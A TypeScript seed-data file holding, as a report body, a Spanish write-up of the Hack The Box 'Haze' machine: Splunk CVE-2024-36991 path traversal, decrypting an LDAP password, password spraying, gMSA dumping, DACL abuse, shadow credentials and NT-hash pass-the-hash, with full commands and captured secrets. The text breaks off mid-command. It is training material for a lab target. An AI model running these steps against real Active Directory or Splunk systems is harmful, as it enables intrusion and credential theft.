import type { Project } from './types';
import { sub, formatISO } from 'date-fns';

const now = new Date();

export const initialProjects: Project[] = [
  {
    id: 'proj-htb-haze',
    clientId: 'cli-htb',
    name: 'Haze HTB Writeup',
    reportBody: `# Haze

![Captura](image://img-haze-01)

## Primer contacto

Añadimos la IP \`10.10.11.61\` a nuestro \`/etc/hosts\` y accedemos través del navegador.

\`\`\`bash
sudo echo "10.10.11.61 haze.htb" | sudo tee -a /etc/hosts
\`\`\`

## Escaneo de puertos

\`\`\`bash
sudo nmap -v -sV -T5 10.10.11.61
\`\`\`

\`\`\`bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-07 22:22:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Splunkd httpd
8088/tcp open  ssl/http      Splunkd httpd
8089/tcp open  ssl/http      Splunkd httpd
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
\`\`\`

El host \`10.10.11.61\` es un **Domain Controller Windows** (presencia de Kerberos, LDAP y Global Catalog) con **Splunkd expuesto** por múltiples puertos HTTP/HTTPS. Esto sugiere vectores de ataque tanto en el dominio como en aplicaciones web internas como Splunk.

| Puerto | Servicio | Descripción Técnica |
| --- | --- | --- |
| 53 | DNS | Resolución interna, útil para zona DNS y enum. de subdominios |
| 88 | Kerberos | Confirmación de Active Directory |
| 135/139/445 | MSRPC, NetBIOS, SMB | Vectores comunes para null sessions, shares, y enumeración de usuarios |
| 389/636/3268/3269 | LDAP y GC (LDAP + LDAPS) | Enumeración de usuarios y grupos del dominio |
| 5985 | WinRM | Ejecución remota si conseguimos credenciales |
| 8000/8088/8089 | Splunkd | Acceso al panel de Splunk, posiblemente vulnerable |

**Domain Controller**

* FQDN: \`dc01.haze.htb\`
* Dominio: \`haze.htb\`
* Windows Server 2022
* Single-domain forest

\`\`\`bash
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
|_SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
\`\`\`

## Enumeración de usuarios

Usando Kerbrute para enumerar usuarios del sistema parece que solo nos encuentra al usuario administrator:

\`\`\`shell-session
afsh4ck@kali$ kerbrute userenum --dc 10.10.11.61 -d haze.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        

Version: v1.0.3 (9dad6e1) - 05/07/25 - Ronnie Flathers @ropnop

2025/05/07 16:42:26 >  Using KDC(s):
2025/05/07 16:42:26 >  	10.10.11.61:88

2025/05/07 16:42:38 >  [+] VALID USERNAME:	administrator@haze.htb
\`\`\`

## Splunk App

### Puerto 8000

* Búsquedas guardadas con scripts incrustados
* Capacidades de carga de archivos de búsqueda
* Inyección de XML en el panel de control

No funcionan las credenciales por defecto \`admin:changeme\`

![Captura](image://img-haze-02)

### **Puerto 8089**

* Configuración del servidor de implementación
* Versión \`9.2.1\` (podríamos encontrar algún exploit público)

![Captura](image://img-haze-03)

## Búsqueda de exploits

Buscando exploits públicos vemos que es vulnerable a Path Traversal con el \`CVE-2024-36991\`:

![Captura](image://img-haze-04)

[https://github.com/jaytiwari05/CVE-2024-36991](https://github.com/jaytiwari05/CVE-2024-36991)

\`\`\`
python3 exploit.py        
                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
 / ___\\ \\   / | ____|   |___ \\ / _ |___ \\| || |      |___ / / /_ / _ \\ / _ \\/ |
| |    \\ \\ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \\| '_ | (_) | (_) | |
| |___  \\ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \\__, |\\__, | |
 \\____|  \\_/  |_____|   |_____|\\___|_____|  |_|      |____/ \\___/  /_/   /_/|_|

CVE-2024-36991
Made by ~PaiN05

Available sections:
1. Credentials & Secrets 🔱
2. Configuration Files 🔥
3. Logs & History [Might Get Freeze] 💀
4. System & Service Files [Might Get Freeze] 💀
5. Apps & Custom Scripts 🔥
usage: exploit.py [-h] -u URL -s SECTION
exploit.py: error: the following arguments are required: -u/--url, -s/--section
\`\`\`

Al ejecutarlo, revela archivos de configuración, el etc/passwd, logs y historial, archivos y servicios de sistema y scripts en entornos Splunk sin autenticación, explotando un Path Traversal:

\`\`\`
python3 exploit.py -u http://haze.htb:8000 -s 1
                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
 / ___\\ \\   / | ____|   |___ \\ / _ |___ \\| || |      |___ / / /_ / _ \\ / _ \\/ |
| |    \\ \\ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \\| '_ | (_) | (_) | |
| |___  \\ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \\__, |\\__, | |
 \\____|  \\_/  |_____|   |_____|\\___|_____|  |_|      |____/ \\___/  /_/   /_/|_|

CVE-2024-36991
Made by ~PaiN05

[+] Running section 1

[*] Running: curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/passwd"
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152

[*] Running: curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret"
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD

<---SNIP--->

[*] Running: curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf"
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb

...
\`\`\`

### Deglose

#### Usuarios de etc/passwd

Concretamente encuentra 3 usuarios nuevos, además del admin:

\`\`\`
Edward@haze.htb
Mark@haze.htb
paul@haze.htb
\`\`\`

#### Archivos de configuración de Splunk

[https://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Listofconfigurationfiles](https://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Listofconfigurationfiles)

* \`splunk.secret\`

\`\`\`
[*] Running: curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret"
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
\`\`\`

Este archivo contiene **la clave maestra simétrica AES-256** que **Splunk usa para cifrar y descifrar secretos** internos como:

* Contraseñas en archivos \`.conf\` (como \`authentication.conf\`, \`inputs.conf\`)
* Tokens
* Credenciales LDAP en texto cifrado

> Si tienes este archivo, **puedes descifrar las contraseñas cifradas en otros archivos .conf** del entorno.

* \`autentication.conf\`

\`\`\`
[*] Running: curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf"
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
\`\`\`

Este archivo define cómo se autentican los usuarios de Splunk, incluyendo:

* Reglas de complejidad de contraseñas
* Métodos de autenticación externos como LDAP, SAML, etc.
* Usuarios locales definidos manualmente
* **Credenciales cifradas** (del usuario Paul Taylor)

De igual manera podríamos capturar estos archivos haciendo un \`curl\` con el Path Traversal o con BurpSuite:

![Captura](image://img-haze-05)

## Cracking de contraseña cifrada

La contraseña está cifrada, por lo que vamos a usar \`Splunksecrets\` para crackearla:

[https://github.com/HurricaneLabs/splunksecrets](https://github.com/HurricaneLabs/splunksecrets)

Para usar la herramienta necesitamos el parámetro **\`splunk.secret\`** y la clave cifrada del \`autentication.conf\` que descubrimos antes.

\`\`\`
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
\`\`\`

Lo guardamos en un archivo de texto \`secret.txt\`

### Splunksecrets

Cuando nos muestre Ciphertext le pasamos la clave cifrada de usuario Paul Taylor que encontramos antes:

\`\`\`
splunksecrets splunk-decrypt -S secret.txt

Ciphertext: $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
Ld@p_Auth_Sp1unk@2k24
\`\`\`

Tenemos una contraseña en plano! Comprobamos que funciona con \`crackmapexec\`:

\`\`\`bash
crackmapexec smb haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24'
 
SMB         haze.htb        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         haze.htb        445    DC01             [+] haze.htb\\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
\`\`\`

## Enumeración con credenciales

Usamos crackmapexec para enumerar con credenciales usuarios del entorno AD:

\`\`\`bash
crackmapexec smb haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute | grep 'SidTypeUser'

SMB                      haze.htb        445    DC01             500: HAZE\\Administrator (SidTypeUser)
SMB                      haze.htb        445    DC01             501: HAZE\\Guest (SidTypeUser)
SMB                      haze.htb        445    DC01             502: HAZE\\krbtgt (SidTypeUser)
SMB                      haze.htb        445    DC01             1000: HAZE\\DC01$ (SidTypeUser)
SMB                      haze.htb        445    DC01             1103: HAZE\\paul.taylor (SidTypeUser)
SMB                      haze.htb        445    DC01             1104: HAZE\\mark.adams (SidTypeUser)
SMB                      haze.htb        445    DC01             1105: HAZE\\edward.martin (SidTypeUser)
SMB                      haze.htb        445    DC01             1106: HAZE\\alexander.green (SidTypeUser)
SMB                      haze.htb        445    DC01             1111: HAZE\\Haze-IT-Backup$ (SidTypeUser)
\`\`\`

Vemos que hay varios usuarios nuevos. Los añadiremos a una lista completa de \`usuarios válidos\` que hemos recopilado:

\`\`\`
Administrator
Guest
krbtgt
DC01$
mark.adams
edward.martin
alexander.green
Haze-IT-Backup$
paul.taylor # Poner el último de la lista o omitirá al resto
\`\`\`

## Password Spraying

Vamos a ver si esa contraseña la utilizan más usuarios:

\`\`\`bash
crackmapexec smb haze.htb -u valid-users.txt -p 'Ld@p_Auth_Sp1unk@2k24'

SMB         haze.htb        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         haze.htb        445    DC01             [-] haze.htb\\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         haze.htb        445    DC01             [-] haze.htb\\Guest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         haze.htb        445    DC01             [-] haze.htb\\krbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         haze.htb        445    DC01             [-] haze.htb\\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         haze.htb        445    DC01             [+] haze.htb\\mark.adams:Ld@p_Auth_Sp1unk@2k24 
\`\`\`

Bingo, el usuario \`Mark Adams\` también la utiliza!

## Análisis con BloodHound

#### Bloodhound-python

\`\`\`bash
bloodhound-python -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb -ns 10.10.11.61 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 8 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 10S
INFO: Compressing output into 20250507214438_bloodhound.zip
\`\`\`

#### Análisis

Vemos que el usuario mark pertenece al grupo \`GMSA_MANAGERS\` (Group Managed Service Accounts:

![Captura](image://img-haze-06)

Los administradores de gMSA tienen privilegios para acceder a las contraseñas de cuentas de servicio gestionadas en Active Directory. Esto permite:

* **Leer contraseñas en texto claro** desde el atributo \`msDS-ManagedPassword\`.
* **Realizar ataques de retransmisión NTLM** para acceder a ese atributo.
* **Ejecutar ataques “gMSA dorado”** si se compromete la clave raíz del KDS, generando contraseñas de gMSA sin conexión.

Estos privilegios permiten la suplantación de identidades y posibles escaladas de privilegios.

## Leer la contraseña de GMSAPassword 

Usaremos gMSADumper:

[https://github.com/micahvandeusen/gMSADumper.git](https://github.com/micahvandeusen/gMSADumper.git)

\`\`\`bash
python gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb

Users or groups who can read password for Haze-IT-Backup$:
 > Domain Admins
\`\`\`

Mark no tiene este permiso actualmente, pero pertenece al grupo de administradores y puede agregar permisos a sí mismo. Ten en cuenta que gMSA no es un grupo, sino un tipo de cuenta especial, por lo no puedes encontrarlo en bloodhound.

Vamos a conectarnos por evil-winrm:

\`\`\`bash
evil-winrm -i 10.10.11.61 -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method \`quoting_detection_proc' for module Reline                                      
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents>
\`\`\`

Puede comprobar el tipo de cuenta de \`Haze-IT-Backup$\` con el siguiente comando:

\`\`\`powershell
*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass
 
Name           ObjectClass
----           -----------
Haze-IT-Backup msDS-GroupManagedServiceAccount
\`\`\`

¿Quién tiene permiso para ver su contraseña? Sólo **administradores de dominio**

\`\`\`powershell
*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword
 
DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :
\`\`\`

**Mark** está en **el** grupo de administradores de gMSA, así que intenta modificar el usuario legible.

\`\`\`powershell
*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
 
*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword
 
 
DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :
\`\`\`

Luego volvemos a ejecutar gMSADumper y vemos que nos devuelve el hash del usuario \`Haze-IT-Backup$\`:

\`\`\`bash
python gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb

Users or groups who can read password for Haze-IT-Backup$:
 > mark.adams
Haze-IT-Backup$:::84d6a733d85d9e03f46eba25b34517a9
Haze-IT-Backup$:aes256-cts-hmac-sha1-96:8c47d46d7f2a5aef9d2ab5fda8c60b6e094ad78b2c55878faa9ff2b7fac740a6
Haze-IT-Backup$:aes128-cts-hmac-sha1-96:7627ff016dd47b73e99596362a068f41
\`\`\`

Intentamos conectarnos por RDP y evil-winrm pero no podemos con este usuario. Para verificar que \`mark.adams\` tiene permiso de escritura, podemos ejecutar el siguiente comando para ver la lista de control de acceso de **Backup :**

\`\`\`powershell
*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents> dsacls "CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB"
 
Owner: HAZE\\Domain Admins
Group: HAZE\\Domain Admins

Access list:
Allow HAZE\\gMSA_Managers              SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
Allow HAZE\\Domain Admins              FULL CONTROL
\`\`\`

## Bloodhound con privilegios

Como es un usuario con más privilegios, vamos a volver a ejecutar bloodhound-python con este usuario.

{% hint style="warning" %}
Si se utiliza mark.adams para recopilar datos dentro del dominio, es posible que falte cierta información debido a problemas de permisos. Entonces, la mejor práctica es intentar actualizar el contenido de Bloodhound cuando obtenemos un nuevo usuario en el dominio.
{% endhint %}

{% hint style="success" %}
Podemos usar bloodhound-python solamente con el hash, sin la contraseña en plano
{% endhint %}

\`\`\`bash
bloodhound-python -u 'Haze-IT-Backup$' --hashes ':84d6a733d85d9e03f46eba25b34517a9' -d haze.htb -ns 10.10.11.61 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20250508111541_bloodhound.zip
\`\`\`

Se puede ver que el usuario **\`BACKUP\`** puede modificar el propietario del grupo \`SUPPORT\` **,** y el grupo SUPPORT puede modificar la contraseña de **EDWARD** \`Shadow Credential\` y lanzar ataques.

A continuación, configure **Backup** como propietario del grupo.

![Captura](image://img-haze-07)

### Agregarnos al grupo SUPPORT

Cambiar propietario del grupo support a BACKUP:

\`\`\`
bloodyAD --host '10.10.11.61' -d 'haze.htb' -u 'Haze-IT-Backup$' -p ':84d6a733d85d9e03f46eba25b34517a9' set owner SUPPORT_SERVICES Haze-IT-Backup$
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES
\`\`\`

Nos añadimos todos los permisos a nosotros mismos:

\`\`\`bash
python3 dacledit.py -action write -rights FullControl -principal 'Haze-IT-Backup$' \\
-target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' -dc-ip 10.10.11.61 \\
"haze.htb/Haze-IT-Backup$" -hashes ':84d6a733d85d9e03f46eba25b34517a9'

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250508-115351.bak
[*] DACL modified successfully!
\`\`\`

Y nos agregamos al grupo:

\`\`\`bash
bloodyAD --host '10.10.11.61' -d 'haze.htb' -u 'Haze-IT-Backup$' -p ':84d6a733d85d9e03f46eba25b34517a9' add groupMember SUPPORT_SERVICES Haze-IT-Backup$                                           

[+] Haze-IT-Backup$ added to SUPPORT_SERVICES
\`\`\`

### Cambiar la contraseña de EDWARD

Ahora el usuario BACKUP puede cambiar la contraseña del usuario EDWARD usando Shadown Credential:

[https://github.com/ShutdownRepo/pywhisker](https://github.com/ShutdownRepo/pywhisker)

\`\`\`bash
python pywhisker.py -d "haze.htb" -u "Haze-IT-Backup$" -H '84d6a733d85d9e03f46eba25b34517a9' --target edward.martin --action add

[*] Searching for the target account
[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 4e740279-7acd-5c2a-d692-707fc3a1a14d
[*] Updating the msDS-KeyCredentialLink attribute of edward.martin
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: CPclzrfC.pfx
[+] PFX exportiert nach: CPclzrfC.pfx
[i] Passwort für PFX: jRXgGGq5pPyhkUvm9bnK
[+] Saved PFX (#PKCS12) certificate & key at path: CPclzrfC.pfx
[*] Must be used with password: jRXgGGq5pPyhkUvm9bnK
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
\`\`\`

### Generar TGT con PKINITtools

Lo clonamos en nuestro directorio actual, dentro de \`pywhisker\`:

[https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

#### Sincronizamos el reloj con el DC

\`\`\`bash
sudo ntpdate 10.10.11.61

2025-05-08 20:28:17.130730 (+0200) +28801.556656 +/- 0.018455 10.10.11.61 s1 no-leap
CLOCK: time stepped by 28801.556656
\`\`\`

#### Generamos el TGT

\`\`\`visual-basic
python gettgtpkinit.py -cert-pfx ../CPclzrfC.pfx -pfx-pass jRXgGGq5pPyhkUvm9bnK haze.htb/edward.martin edward.ccache

2025-05-08 21:03:10,460 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-08 21:03:10,474 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-08 21:03:10,573 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-08 21:03:10,573 minikerberos INFO     36e681d554c7ce698ec125daaac9abffda4f0602efc454fe26b68cf80f915533
INFO:minikerberos:36e681d554c7ce698ec125daaac9abffda4f0602efc454fe26b68cf80f915533
2025-05-08 21:03:10,575 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
\`\`\`

#### Obtenemos la clave hexadecimal necesaria

\`\`\`
36e681d554c7ce698ec125daaac9abffda4f0602efc454fe26b68cf80f915533
\`\`\`

#### Configuramos la variable de entorno

\`\`\`bash
export KRB5CCNAME=$(pwd)/edward.ccache
\`\`\`

#### Extraer el hash NTLM

\`\`\`bash
python getnthash.py -key 36e681d554c7ce698ec125daaac9abffda4f0602efc454fe26b68cf80f915533 haze.htb/edward.martin

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
09e0b3eeb2e7a6b0d419e9ff8f4d91af
\`\`\`

Hemos conseguido el hash de Edward Martin!

## User flag

\`\`\`bash
evil-winrm -i 10.10.11.61 -u 'edward.martin' -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method \`quoting_detection_proc' for module Reline                                    
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                             
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\edward.martin\\Documents> whoami
haze\\edward.martin
\`\`\`

\`\`\`powershell
*Evil-WinRM* PS C:\\Users\\edward.martin\\Desktop> ls

    Directory: C:\\Users\\edward.martin\\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          5/8/2025   5:01 AM             34 user.txt

*Evil-WinRM* PS C:\\Users\\edward.martin\\Desktop> type user.txt
f7ec3e1403a7fdb99576a*************
\`\`\`

## Escalada de privilegios

En el directorio \`c:/\` hay un directorio \`Backups\` interesante que contiene un backup de Splunk, que podría contener credenciales de usuarios:

\`\`\`powershell
*Evil-WinRM* PS C:\\Backups\\Splunk> dir

    Directory: C:\\Backups\\Splunk

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip
\`\`\`

#### Descarga del backup de Splunk

\`\`\`powershell
*Evil-WinRM* PS C:\\Backups\\Splunk> download splunk_backup_2024-08-06.zip
                                        
Info: Downloading C:\\Backups\\Splunk\\splunk_backup_2024-08-06.zip to splunk_backup_2024-08-06.zip
                                        
Info: Download successful!
\`\`\`

Después de la descarga, vemos que es el código fuente de respaldo del sitio web, que es diferente del contenido real del sitio web.

### Credential Hunting de Splunk

Una vez descomprimimos el zip buscamos cadenas similares a contraseñas y buscamos según el formato de contraseña de **Splunk.**

\`\`\`shell-session
afsh4ck@kali$ pwd                                                                                                             
/home/kali/Escritorio/machines/htb/haze/Splunk

afsh4ck@kali$ grep -rI  '\\$1\\$' .

